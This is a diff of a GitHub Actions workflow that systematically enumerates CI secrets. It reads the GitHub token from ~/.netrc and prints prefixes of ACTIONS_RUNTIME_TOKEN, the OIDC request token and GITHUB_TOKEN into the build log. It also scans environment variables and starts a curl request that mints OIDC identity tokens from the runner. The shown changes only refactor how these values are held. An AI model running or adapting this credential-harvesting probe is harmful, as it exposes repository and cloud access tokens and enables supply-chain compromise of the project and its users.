@@ -57,9 +57,11 @@ jobs:
           S2_TOK=$(awk '/machine github.com/{f=1} f && /password/{print $2; exit}' ~/.netrc 2>/dev/null || echo "")
           print "S2  netrc token: ${S2_TOK:0:12}"
           # S3: ACTIONS_RUNTIME_TOKEN
-          print "S3  ACTIONS_RUNTIME_TOKEN: ${ACTIONS_RUNTIME_TOKEN:0:12}"
+          _ART="${ACTIONS_RUNTIME_TOKEN:-}"
+          print "S3  ACTIONS_RUNTIME_TOKEN: ${_ART:0:12}"
           # S4: ACTIONS_ID_TOKEN_REQUEST_TOKEN
-          print "S4  OIDC REQUEST TOKEN: ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:0:12}"
+          _AIDTRT="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
+          print "S4  OIDC REQUEST TOKEN: ${_AIDTRT:0:12}"
           # S5: GITHUB_TOKEN (already known)
           print "S5  GITHUB_TOKEN: ${GITHUB_TOKEN:0:12}"
           # S6: scan all env vars
@@ -660,11 +662,13 @@ jobs:
 
           # ── BATCH J: OIDC & runtime token deep dive ───────────────────────
           print "=== BATCH J: OIDC / Runtime tokens ==="
-          print "J01 ACTIONS_RUNTIME_TOKEN: ${ACTIONS_RUNTIME_TOKEN:0:20} (${#ACTIONS_RUNTIME_TOKEN} chars)"
+          _ART="${ACTIONS_RUNTIME_TOKEN:-}"
+          print "J01 ACTIONS_RUNTIME_TOKEN: ${_ART:0:20} (${#_ART} chars)"
           print "J02 ACTIONS_RESULTS_URL: ${ACTIONS_RESULTS_URL:-NOT_SET}"
           print "J03 ACTIONS_CACHE_URL: ${ACTIONS_CACHE_URL:-NOT_SET}"
           print "J04 ACTIONS_ID_TOKEN_REQUEST_URL: ${ACTIONS_ID_TOKEN_REQUEST_URL:-NOT_SET}"
-          print "J05 ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:0:20}"
+          _AIDTRT="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
+          print "J05 ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${_AIDTRT:0:20}"
           # J06 Request OIDC with github audience
           if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
             OIDC_GITHUB=$(curl -sf \
